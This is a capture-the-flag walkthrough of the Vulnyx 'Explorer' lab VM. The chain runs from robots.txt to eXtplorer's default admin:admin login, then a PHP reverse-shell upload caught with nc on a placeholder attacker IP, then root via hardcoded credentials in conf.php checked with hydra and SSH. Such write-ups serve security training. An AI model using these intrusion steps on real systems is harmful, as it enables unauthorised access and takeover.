# Vulnyx: Explorer

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `nc` · `hydra` |
| **Tags** | `#DefaultCreds` `#FileUpload` `#RCE` `#HardcodedCreds` |
| **URL** | https://vulnyx.com/machines/ |

`robots.txt` leaks the path to an eXtplorer instance — a web-based file manager — still running with its default `admin:admin` credentials. Its file management features are enough to upload a PHP reverse shell and get code execution. From there, eXtplorer's own configuration file turns out to hold hardcoded root credentials, giving direct SSH access.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn explorer.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:49:4B:E3 (Oracle VirtualBox virtual NIC)
```

Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV explorer.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/extplorer
|_http-server-header: Apache/2.4.65 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:49:4B:E3 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The `robots.txt` disallow entry is already visible directly in the nmap script output — a first hint at what's coming in web enumeration.

### Web Enumeration

The main page:

```
http://explorer.nyx
```

<img src="../Images\explorer\Pasted image 20260719165518.png"/>

A content discovery scan is run against the site:

```bash
$ ffuf -u http://explorer.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

.html                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 7ms]
                       [Status: 200, Size: 186, Words: 28, Lines: 8, Duration: 9ms]
.php                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 549ms]
index.html             [Status: 200, Size: 186, Words: 28, Lines: 8, Duration: 555ms]
robots.txt             [Status: 200, Size: 35, Words: 3, Lines: 3, Duration: 8ms]
.php                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5ms]
.html                  [Status: 200, Size: 186, Words: 28, Lines: 8, Duration: 11ms]
server-status          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 25ms]
:: Progress: [882188/882188] :: Job [1/1] :: 1298 req/sec :: Duration: [0:11:40] :: Errors: 0 ::
```

`robots.txt` is checked directly as well, since it often lists paths that weren't caught by the wordlist:

```
http://explorer.nyx/robots.txt
```

<img src="../Images/explorer\Pasted image 20260719165630.png"/>

> **Endpoint:** `/extplorer`

#### eXtplorer

```
http://explorer.nyx/extplorer
```
<img src="../Images/explorer\Pasted image 20260719165650.png"/>

This is eXtplorer, a web-based file manager. The login page is worth trying default credentials against before anything else:

> **Default credentials:** `admin:admin`

<img src="../Images\explorer\Pasted image 20260719165714.png"/>
<img src="../Images\explorer\Pasted image 20260719165731.png"/>
<img src="../Images\explorer\Pasted image 20260719165752.png"/>

They work, and the login grants full access to the underlying file manager — which means uploading and running arbitrary files on the web server.

## Initial Access

### Uploading a Web Shell

A PHP reverse shell is uploaded through eXtplorer's file manager and requested directly to trigger it:

```
http://explorer.nyx/rev_shell.php
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [explorer.nyx] 41280
Linux explorer 6.1.0-39-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.148-1 (2025-08-26) x86_64 GNU/Linux
 16:39:59 up 14 min,  0 user,  load average: 14.17, 13.46, 8.75
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
www-data@explorer:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@explorer:~$ ls -l /home
total 4
-r-------- 1 www-data www-data 33 Sep 13  2025 user.txt
www-data@explorer:~$ cat /home/user.txt
3f2580ab16ac82c9e0adaf0dad3a900d
```

> **User flag:** `3f2580ab16ac82c9e0adaf0dad3a900d`

## Privilege Escalation

### Hardcoded Credentials in eXtplorer's Config

Rather than a local exploit, the path to root here comes from eXtplorer's own configuration file, readable from the current shell:

```bash
www-data@explorer:~$ ls -l /var/www/html
www-data@explorer:~$ ls -l /var/www/html/extplorer
www-data@explorer:~$ ls -l /var/www/html/extplorer/config
www-data@explorer:~$ cat /var/www/html/extplorer/config/conf.php
```

<img src="../Images\explorer\Pasted image 20260722162641.png"/>

The file holds a hardcoded set of credentials for `root`:

> **Credentials:** `root:AccessGranted#1`

They're validated against SSH:

```bash
$ hydra -l 'root' -p 'AccessGranted#1' ssh://explorer.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://explorer.nyx:22
[22][ssh] host: explorer.nyx   login: root   password: AccessGranted#1
1 of 1 test successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-19 10:44:01
```

They check out, and root is reached directly:

```bash
$ ssh root@explorer.nyx
root@explorer.nyx's password:
root@explorer:~# id
uid=0(root) gid=0(root) groups=0(root)
root@explorer:~# ls -l /root
total 4
-r-------- 1 root root 33 Sep 13  2025 root.txt
root@explorer:~# cat /root/root.txt
9a045d36c5a28f01784bdcfb326accfe
```

> **Root flag:** `9a045d36c5a28f01784bdcfb326accfe`

## Takeaways

- Default credentials on third-party software (`admin:admin` and similar) are still one of the most common ways into a box, especially for admin panels and management tools that aren't internet-facing by design.
- `robots.txt` is written for search engine crawlers, not for hiding content from people — it's often one of the first places to check during content discovery, not an afterthought.
- Application configuration files are a common place to find credentials that were never meant to be shared this widely — including ones for accounts far more privileged than the application itself needs.